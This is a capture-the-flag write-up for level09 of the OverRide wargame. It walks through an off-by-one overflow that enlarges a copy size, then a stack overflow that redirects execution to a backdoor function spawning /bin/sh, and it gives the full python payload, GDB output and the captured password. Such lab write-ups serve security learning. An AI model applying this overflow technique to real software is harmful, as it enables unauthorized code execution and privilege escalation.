Level09 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

Level09 rights:
```Shell
level09@OverRide:~$ ls -la level09 
-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
```

Decompiling with Hex-Rays on https://dogbolt.org/ show us that:
- an unused `secret_backdoor` function is present which take a n input string and use it to execute a call to `system()`. Passing `/bin/sh` should open a shell.
- the program use the buffer address to store a message (string), the buffer address + 140 to store a username (string) and the buffer address + 180 as a size (int). So we can deduce that this is probably a structure:
```
    char    message[140];
    char    name[40];
    int     size;
```
- the size is used by strncpy to copy the user input  into message
- the set_username function copy 41 bytes in the string name which is 40 bytes. it is followed by size, so overflowing username allow us to modify the size.
So overflowing a first time to modify the size of the copy allow us to overflow a second time to modify `EIP` with the address of `secret_backdoor` to whom we will pass `/bin/sh` to be executed by `system()`.

Using a buffer overflow pattern, we search for the offset between the beginning of message variable and `EIP`.
We will use 40 bytes of padding and set the following bytes to `0xff`, the highest possible value for a byte, hoping it will be enough to overwrite `EIP`.
```Shell
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) p $rbp
$1 = (void *) 0x6741356741346741
```
We get a segmentation fault, but we can’t use its address with our tool, so we will use the address of `EBP` instead. We get an offset of 192; adding 8 bytes (the size of an address in 64-bit) gives us the offset to reach `EIP`, which is 200.

Using GDB we get the address of `secret_backdoor()` which is `0x55555555488c`:
```Shell
(gdb) p secret_backdoor
$4 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

So our payload will be:
- 40 bytes of padding follow by `0xff`.
- 200 bytes of padding followed by the address of `secret_backdoor`.
- the input for `secret_backdoor()`: `/bin/sh`.

```Shell
level09@OverRide:~$ python -c 'print("A" * 40 + "\xff" + "\n" + "B" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n")' > /tmp/payload9
level09@OverRide:~$ cat /tmp/payload9 - | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```